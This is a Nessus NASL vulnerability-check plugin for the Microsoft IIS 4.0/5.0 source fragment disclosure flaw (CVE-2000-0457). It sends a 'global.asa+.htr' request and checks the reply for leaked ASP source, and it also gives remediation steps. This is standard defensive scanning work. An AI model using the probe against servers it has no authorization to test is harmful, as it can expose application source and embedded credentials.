#
# Test Microsoft IIS 4.0/5.0 Source Fragment Disclosure Vulnerability
#
# Script writen by Pedro Antonio Nieto Feijoo <pedron@cimex.com.cu>
#

# Changes by Tenable:
# - Output formatting, family change (9/5/09)


include("compat.inc");

if(description)
{
 script_id(10680);
 script_version("$Revision: 1.43 $");
 script_cvs_date("$Date: 2016/05/16 14:02:51 $");

 script_cve_id("CVE-2000-0457", "CVE-2000-0630");
 script_bugtraq_id(1193, 1488);
 script_osvdb_id(564, 1325);
 script_xref(name:"CERT", value: "35085");
 script_xref(name:"MSFT", value: "MS01-004");

 script_name(english:"Microsoft IIS Source Fragment Disclosure");
 script_summary(english:"Test Microsoft IIS Source Fragment Disclosure");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"Microsoft IIS 4.0 and 5.0 can be made to disclose fragments of source
code which should otherwise be inaccessible.  This is done by appending
'+.htr' to a request for a known '.asp' (or '.asa', '.ini', 'etc')
file." );
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms01-004" );
 script_set_attribute(attribute:"solution", value:
".htr script mappings should be removed if not required.

- open Internet Services Manager
- right click on the web server and select properties
- select WWW service | Edit | Home Directory | Configuration
- remove the application mappings reference to .htr

If .htr functionality is required, install the relevant patches 
from Microsoft (MS01-004)." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/05/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/01/14");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2016 Pedro Antonio Nieto Feijoo");
 script_family(english:"Web Servers");

 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/ASP");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("http_func.inc");

BaseURL="";        # root of the default app

port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);

banner = get_http_banner(port:port);
if (!banner) exit(0, "The web server on port "+port+" did not answer.");
if( banner !~ "Microsoft-IIS/(4\.|5\.0)" ) exit(0, "The web server listening on port "+port+" is not IIS/4.x or 5.0.");

if(get_port_state(port))
{
  soc=http_open_socket(port);
  if (soc)
  {
    req = http_get(item:"/", port:port);
    send(socket:soc,data:req);
    data = http_recv(socket:soc);

    if ( ! data ) exit(0);
    if(egrep(pattern:"^HTTP.* 40[123] .*", string:data) )exit(0); # if default response is Access Forbidden, a false positive will result
    if("WWW-Authenticate" >< data)exit(0); 
    http_close_socket(soc);

    # Looking for the 302 Object Moved ...
    if (data)
    {
      if (" 302 " >< data)
      {
        # Looking for Location of the default webapp
        tmpBaseURL=egrep(pattern:"Location:*",string:data);

        # Parsing Path
        if (tmpBaseURL)
        {
          tmpBaseURL=tmpBaseURL-"Location: ";
          len=strlen(tmpBaseURL);
          strURL="";

          for (j=0;j<len;j=j+1)
          {
            strURL = string(strURL,tmpBaseURL[j]);
            if (tmpBaseURL[j]=="/")
            {
              BaseURL=string(BaseURL,strURL);
              strURL="";
            }
          }
        }
      }
    }

    if (BaseURL=="") BaseURL="/";

    # We're going to attack!
    soc = http_open_socket(port);

    if (soc)
    {
      req = http_get(item:BaseURL, port:port);
      send(socket:soc, data:req);
      data = http_recv(socket:soc);
      http_close_socket(soc);
      if ( ! data ) exit(0);
      if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 40[13] .*", string:data))exit(0);
      if("WWW-Authenticate:" >< data)exit(0);
      
      soc = http_open_socket(port);
      if(!soc)exit(0);

      req = http_get(item:string(BaseURL,"global.asa+.htr"), port:port);
      send(socket:soc, data:req);
      code = recv_line(socket:soc, length:1024);
      if(!strlen(code))exit(0);
      data = http_recv(socket:soc);
      http_close_socket(soc);
      
      # HTTP/1.x 200 - Command was executed
      if (" 200 " >< code)
      {
        if ("RUNAT"><data)
        {
          report = string(
            "We could disclose the source code of the \n", 
            string(BaseURL, "global.asa")," script\n",
            "on the remote web server.\n",
            "\n"
          );
          security_warning(port:port, extra:report);
        }
      }
      # HTTP/1.x 401 - Access denied
      # HTTP/1.x 403 - Access forbidden
      else
      {
        if (" 401 " >< code)
        {
          security_warning(port:port);
        }
        else
        {
          if (" 403 " >< code)
          {
            security_warning(port:port);
          }
        }
      }
    }
  }
}



